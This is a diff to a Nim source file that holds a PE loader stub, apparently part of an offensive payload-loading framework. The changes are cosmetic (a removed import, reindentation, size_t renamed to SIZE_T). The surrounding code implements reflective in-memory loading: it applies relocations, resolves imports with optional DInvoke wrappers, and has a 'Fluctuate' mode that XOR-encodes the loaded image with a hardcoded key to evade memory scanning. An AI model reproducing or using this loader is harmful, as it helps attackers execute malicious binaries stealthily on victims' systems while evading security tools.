@@ -1,15 +1,14 @@
 let PELoadStub * = """
 
-from winim import size_t
 
-type
-    BASE_RELOCATION_ENTRY {.bycopy.} = object
-      Offset {.bitsize: 12.}: WORD
-      Type {.bitsize: 4.}: WORD
+    type
+        BASE_RELOCATION_ENTRY {.bycopy.} = object
+            Offset {.bitsize: 12.}: WORD
+            Type {.bitsize: 4.}: WORD
 
 
-const
-    RELOC_32BIT_FIELD = 3
+    const
+        RELOC_32BIT_FIELD = 3
 
     when defined(DInvoke):
         let curProc = MyGetCurrentProcessId()
@@ -59,14 +58,14 @@ const
         var parsedSize: csize_t = 0
         while parsedSize < maxSize:
           reloc = cast[ptr IMAGE_BASE_RELOCATION]((
-              size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
+              SIZE_T(relocAddr) + SIZE_T(parsedSize) + cast[SIZE_T](modulePtr)))
           if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
             break
           var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
               csize_t(sizeof((BASE_RELOCATION_ENTRY)))
           var page: csize_t = csize_t(reloc.VirtualAddress)
           var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
-              cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
+              cast[SIZE_T](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
           var i: csize_t = 0
           while i < entriesNum:
             var offset: csize_t = entry.Offset
@@ -76,13 +75,13 @@ const
               break
             if entryType != RELOC_32BIT_FIELD:
               return false
-            if size_t(reloc_field) >= moduleSize:
+            if SIZE_T(reloc_field) >= moduleSize:
               return false
             var relocateAddr: ptr csize_t = cast[ptr csize_t]((
-                cast[size_t](modulePtr) + size_t(reloc_field)))
+                cast[SIZE_T](modulePtr) + SIZE_T(reloc_field)))
             (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
             entry = cast[ptr BASE_RELOCATION_ENTRY]((
-                cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
+                cast[SIZE_T](entry) + sizeof((BASE_RELOCATION_ENTRY))))
             inc(i)
           inc(parsedSize, reloc.SizeOfBlock)
         return parsedSize != 0
@@ -154,9 +153,9 @@ const
               boolvar = true
             if (boolvar):
               when defined(DInvoke):
-                  var libaddr: size_t = cast[size_t](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+                  var libaddr: SIZE_T = cast[SIZE_T](MyGetProcAddress(MyLoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
               else:
-                  var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
+                  var libaddr: SIZE_T = cast[SIZE_T](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
               when defined amd64:
                   fieldThunk.u1.Function = ULONGLONG(libaddr)
               else:
@@ -221,7 +220,7 @@ const
 
         when defined(Fluctuate):
             g_fluctuationData.shellcodeAddr = dectext[0].addr
-            g_fluctuationData.shellcodeSize = size_t(ntHeader.OptionalHeader.SizeOfImage)
+            g_fluctuationData.shellcodeSize = SIZE_T(ntHeader.OptionalHeader.SizeOfImage)
             # Will change the hardcoded key later on
             when defined(amd64):
                 g_fluctuationData.encodeKey = 0x1337DE4D
@@ -281,7 +280,7 @@ const
           echo status
         
         
-        var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
+        var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[SIZE_T](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
         var i: int = 0
         while i < cast[int](ntHeader.FileHeader.NumberOfSections):
           var dest: LPVOID = (preferAddr + SectionHeaderArr[i].VirtualAddress)
